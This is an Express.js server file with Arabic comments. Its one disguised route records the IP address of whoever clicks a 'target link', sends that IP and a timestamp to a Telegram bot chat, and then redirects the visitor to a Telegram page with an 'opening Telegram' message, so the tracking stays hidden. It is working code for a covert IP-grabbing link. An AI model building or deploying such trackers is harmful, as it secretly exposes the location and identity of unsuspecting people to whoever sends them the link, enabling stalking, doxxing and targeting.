const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/uUl8iPwh5iYTVk', async (req, res) => {
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log("Target Link Clicked! Visitor IP: " + visitorIp);
    
    // إرسال تنبيه لتليجرام
    try {
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        const message = `🚨 New Visitor IP Detected!\nIP: ${visitorIp}\nTime: ${new Date().toISOString()}`;
        
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
    } catch (err) {
        console.log("Telegram Error: ", err);
    }
    
    // التوجيه
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <script>
                window.location.href = "https://t.me/uUl8iPwh5iYTVk";
            </script>
        </head>
        <body>
            <p style="text-align: center; margin-top: 50px;">جاري فتح تليغرام...</p>
        </body>
        </html>
    `);
});

app.get('/', (req, res) => {
    res.send('Server is active.');
});

module.exports = app;

app.listen(PORT, () => {
    console.log("Server is running...");
});
